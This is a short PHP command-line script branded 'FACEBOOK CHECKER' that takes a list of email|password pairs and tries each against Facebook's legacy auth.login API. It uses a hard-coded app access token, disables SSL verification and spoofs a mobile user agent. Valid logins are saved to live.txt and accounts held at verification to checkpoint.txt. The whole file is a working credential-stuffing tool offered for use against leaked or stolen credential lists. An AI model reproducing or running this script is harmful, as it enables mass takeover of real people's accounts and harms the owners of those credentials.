<?php
/**
* @author Rifqi Haidar [Recoded By F0xBase]
* @package FACEBOOK CHECKER
*/
$kuning = "\e[1;33m";
$cyan = "\e[1;96m";
echo "$cyan+------------------------------------------------+

  ╔═╗┌─┐┌─┐┌─┐┌┐ ┌─┐┌─┐┬┌─  ┌─┐┬ ┬┌─┐┌─┐┬┌─┌─┐┬─┐
  ╠╣ ├─┤│  ├┤ ├┴┐│ ││ │├┴┐  │  ├─┤├┤ │  ├┴┐├┤ ├┬┘
  ╚  ┴ ┴└─┘└─┘└─┘└─┘└─┘┴ ┴  └─┘┴ ┴└─┘└─┘┴ ┴└─┘┴└─
    ".date("Y-m-d H:i:s")."     FACEBOOK CHECKER

+------------------------------------------------+ \n\n";

if(isset($argv[1])) {
    if(file_exists($argv[1])) {
        $ambil = explode(PHP_EOL, file_get_contents($argv[1]));
        foreach($ambil as $empaslist) {
            $potong = explode("|", $empaslist);
            cekfb($potong[0], $potong[1]);
        }
    }else die("File doesn't exist!");
}else die("$kuning Usage: php check.php list.txt \n");

function cekfb($email, $passwd) {
    $oneforall = array(
        "access_token" => "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
        "email" => $email,
        "password" => $passwd,
        "locale" => "en_US",
        "format" => "JSON"
    );
    $sig = "";
    foreach($oneforall as $key => $value) { $sig .= $key."=".$value; }
    $sig = md5($sig);
    $oneforall['sig'] = $sig;
    $ch = curl_init("https://api.facebook.com/method/auth.login");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $oneforall);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, "Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10");
    $hasilcreate = json_decode(curl_exec($ch));
    
    sleep(1);
	  echo "\e[1;0m =>\e[1;0m ";
    $empas =  $email."|".$passwd;
    if(isset($hasilcreate->access_token)) { 
        echo $empas."  \e[1;92m [LIVE]".PHP_EOL;
        file_put_contents("live.txt", $empas.PHP_EOL, FILE_APPEND);
    }elseif($hasilcreate->error_code == 405 || preg_match("/User must verify their account/i", $hasilcreate->error_msg)) {
		echo  $empas."\e[1;91m [CHECKPOINT]\e[1;0m".PHP_EOL;
        file_put_contents("checkpoint.txt", $empas.PHP_EOL, FILE_APPEND);
    }else echo  $empas."\e[1;91m [DEAD]\e[1;0m".PHP_EOL;
}
